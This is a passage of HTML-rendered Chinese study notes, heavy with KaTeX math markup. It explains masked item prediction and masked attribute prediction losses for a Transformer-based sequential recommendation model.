class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span></span></span></span> 和被掩码的项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">i_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80952em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 时，将它们视为不同的视图，以融合来学习数据表示</p>\n</li>\n<li>\n<p>我们以一下公式最小化掩蔽项目预测（MIP）损失:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>L</mi><mrow><mi>M</mi><mi>I</mi><mi>P</mi></mrow></msub><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>t</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>t</mi></msub><mo stretchy=\"false\">)</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">[</mo><munder><mo>∑</mo><mrow><mover accent=\"true\"><mi>i</mi><mo>~</mo></mover><mo>∈</mo><mi>I</mi><mo>∖</mo><mo stretchy=\"false\">{</mo><msub><mi>i</mi><mi>t</mi></msub><mo stretchy=\"false\">}</mo></mrow></munder><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>t</mi></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">L_{MIP}(C_{i_t},i_t)=f(C_{i_t},i_t)-\\log[\\sum_{\\tilde{i}\\in I\\setminus\\{i_t\\}}f(C_{i_t},i_t)]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0001em;vertical-align:-0.2501em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0001em;vertical-align:-0.2501em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.668476em;vertical-align:-1.618471em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\">[</span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.706529em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.89638em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.2785200000000003em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span><span class=\"mbin mtight\">∖</span><span class=\"mopen mtight\">{</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mclose mtight\">}</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.618471em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">]</span></span></span></span></span></p>\n<ul>\n<li>\n<p>其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>i</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\tilde i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.89638em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.89638em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">i</span></span><span style=\"top:-3.57852em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span></span></span></span> 表示不相关项，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(.,.)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mclose\">)</span></span></span></span> 根据以下公式实现</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo separator=\"true\">,</mo><msub><mi>i</mi><mi>t</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msubsup><mi mathvariant=\"bold\">F</mi><mi>t</mi><mi mathvariant=\"normal\">⊤</mi></msubsup><mo>⋅</mo><msub><mi mathvariant=\"bold\">W</mi><mrow><mi>M</mi><mi>I</mi><mi>P</mi></mrow></msub><mo>⋅</mo><msub><mi mathvariant=\"bold\">e</mi><msub><mi>i</mi><mi>t</mi></msub></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(C_{i_t},i_t)=\\sigma(\\mathbf{F}_t^\\top\\cdot\\mathbf{W}_{MIP}\\cdot\\mathbf{e}_{i_t})\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0001em;vertical-align:-0.2501em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1491079999999998em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999998em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">⊤</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83611em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0001em;vertical-align:-0.2501em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">e</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></p>\n<ul>\n<li>其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mrow><mi>M</mi><mi>I</mi><mi>P</mi></mrow></msub><mo>∈</mo><msup><mi mathvariant=\"script\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">W_{MIP}\\in \\mathcal R^{d×d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8491079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 是需要学习的参数矩阵，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>F</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">F_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是使用双向 Transformer 架构来与式 [13] 相同的方式获得的第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.61508em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">t</span></span></span></span> 个位置的学习到的表示</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"建模序列-属性相关性\"><a class=\"anchor\" href=\"#建模序列-属性相关性\">#</a> 建模序列 - 属性相关性</h3>\n<ul>\n<li>\n<p>将属性信息与序列上下文直接融合</p>\n</li>\n<li>\n<p>根据周围环境恢复被屏蔽项目的属性</p>\n</li>\n<li>\n<p>给定一个被屏蔽的项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">i_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.80952em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，我们将其周围的上下文<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>C</mi><msub><mi>i</mi><mi>t</mi></msub></msub></mrow><annotation encoding=\"application/x-tex\">C_{i_t}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.93343em;vertical-align:-0.2501em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span></span></span></span> 和其属性集<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"script\">A</mi><msub><mi>i</mi><mi>t</mi></msub></msub></mrow><annotation encoding=\"application/x-tex\">\\mathcal A_{i_t}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.93343em;vertical-align:-0.2501em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2501em;\"><span></span></span></span></span></span></span></span></span></span> 视为 MIM 的两个不同视图，故开发掩蔽属性损失 MAP 如下：</p>\n<p><span class=\"katex-display\"><span 